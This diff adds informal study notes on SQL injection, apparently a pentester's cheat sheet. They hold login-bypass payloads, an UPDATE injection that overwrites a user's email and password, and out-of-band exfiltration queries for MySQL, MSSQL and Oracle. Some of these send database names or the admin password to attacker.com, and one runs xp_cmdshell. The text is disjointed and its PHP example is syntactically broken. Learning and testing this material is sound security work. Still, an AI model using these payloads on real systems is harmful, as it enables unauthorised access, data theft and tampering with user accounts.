@@ -1,0 +1,110 @@
+The following code demonstrates a dynamic SQL query in a login from. The user and password variables from the POST request is concatenated directly into the SQL 
+
+
+## Detecting SQL injection :
+1...	A query for a non-existent product should return no results:
+	http://example.com/search?query=notexist 
+
+2...	If the application is vulnerable to SQLi, a boolean-based payload that always returns true could return unexpected results:
+	http://example.com/search?query=notexist' OR true-- -
+
+3...	Alternatively, injecting a single quotation mark (') may trigger a database error or 500 Internal Server Error, indicating improper input sanitisation:
+	http://example.com/search?query=notexist'
+
+4...	Time-based SQLi, a more complicated variant, abuses delays in query execution. For example, in PostgreSQL, the following payload forces a four-second delay if vulnerable:
+	http://example.com/search?query=noexist' OR sleep(4) -- -
+
+
+
+
+statement.
+
+$query = "SELECT * FROM users WHERE username='" + $_POST["user"] + "' AND password= '" + $_POST["password"]$ + '";"
+
+If the attacker supplies the value ' OR 1=1-- - inside the name parameter
+
+The reason for using -- - instead of
+--
+is primarily because of how MySQL handles the double-dash comment style.
+( You can also use -- a , -- b , -- <any character> but -- - as the most interoperable and safest inline SQL comment
+
+Read this artical ---- https://blog.raw.pm/en/sql-injection-mysql-comment/
+
+
+SQL  Injection 1: Input Box Non-String ::
+	SQL query in backend--
+	SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID=10 AND password = 'ce5ca67...'
+	here user supplying profileID as an integer, if there is no INPUT SANITIZATION than the bypass will be 
+	BYPASS ---
+	1 or 1=1-- -
+
+SQL Injection 2: Input Box String ::
+	if previous sql query taking the ProfileID as string [ like profileID='10']
+	Since it expects a string, we need to modify our payload to bypass the login slightly. The following line will let us in:
+	BYPASS
+	1' or '1'='1'-- -
+
+SQL Injection 3 : URL Injection ::
+	But in this case, the malicious user input cannot be injected directly into the application via the login form because some CLIENT_SIDE FILTERATION have been implemented:
+	=> a proxy tool such as Burp Suite can be used to bypass the client side JavaScript validation
+	
+	The login and the client-side validation can then easily be bypassed by going directly to this URL: 
+	http://domain.com/login?profileID=-1' or 1=1-- -&password=a   
+	[Nowadays nobody shows login parameters in the URLs]
+
+SQL Injection 4: POST Injection ::
+	U can use burpsuit or similar proxy tool to modify the post request of the login functionality and try SQL injection on it...
+
+
+SQL  Injection Attack on an UPDATE Statement ::
+	UPDATE statements are used to modify one or more existing rows of data within a table.
+	Mostly used in update username or password fields..
+	The flow of the query in the backend is like this ---->>  UPDATE contacts SET Email="User@test.com" , address="address" WHERE Name = 'User'
+	but if we add address"-- to our address input it will bypass the where filter and will change the email of all users to the email provided..
+	[ If query get executed it will affect all the data of the database, so we carefull don't inject it ]
+	
+	example: U entered --- hacker@evil.com', password='pwned    in the update email field and if this query will get executed like Below
+				 UPDATE users SET email = 'hacker@evil.com', password='pwned' WHERE id = 5
+				Than password and email of user will get changed from email update field
+
+
+Out-Of-Band SQL::
+	Two channels are involved:
+
+	    The attack channel: your normal web request with the injection payload.
+	    The data channel: an outbound network request (DNS or HTTP) that the database server makes to your server, with the exfiltrated data baked into the request itself.
+
+	DNS Exfiltration With MySQL---->
+		SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\share'));
+	MSSQL Techniques--------->
+		xp_dirtree triggers a DNS lookup by trying to list a directory on a remote server:
+		EXEC master..xp_dirtree '\\attacker.com\share';
+
+		xp_cmdshell (if it is enabled) runs OS commands directly, so you can use nslookup or curl to ship data out:
+		EXEC xp_cmdshell 'nslookup data.attacker.com';
+
+
+
+Blind SQL injection with out-of-band interaction::
+	check it  when there is no error or difference in the response of the server but the server is executing the sql Queries with another thread process. Use burp collaborator or webhook server to interact with it..
+	Sometimes you can't see any response difference at all — not even timing (maybe there's a load balancer, async processing, or heavy caching messing with timing reliability). OOB injection solves this by making the database itself reach out to a server you control, over a completely different channel (usually DNS or HTTP). You're not waiting for a response in the original request at all — you're waiting for the database to call home.
+	Why It's Needed:-
+
+		Time-based can be unreliable on networks with variable latency
+		Some environments have egress restrictions but still allow DNS resolution
+		It gives you guaranteed, unambiguous proof — either your server got a hit, or it didn't
+
+	some payloads for this are below..
+	payload ::
+		DNSExfilteration in MSSQL ---->>> '; EXEC master..xp_dirtree '\\attacker-controlled.burpcollaborator.net\test'--
+		Oracle OOB ----->> SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE username='admin')) FROM dual
+		MySQL OOB ----->> SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\test'))
+		
+
+
+SQL injection with filter bypass via XML encoding explain this::
+	First check if the SQLI exists or not and than analyze the error server is throwing on the payload..
+	In this attack WAF always active and checks for special character if found it will encode them and prevent the SQLI.
+	Use hexvector extension to convert the payload to the hex_entity or dec entity and than configure the Payload command.
+	
+
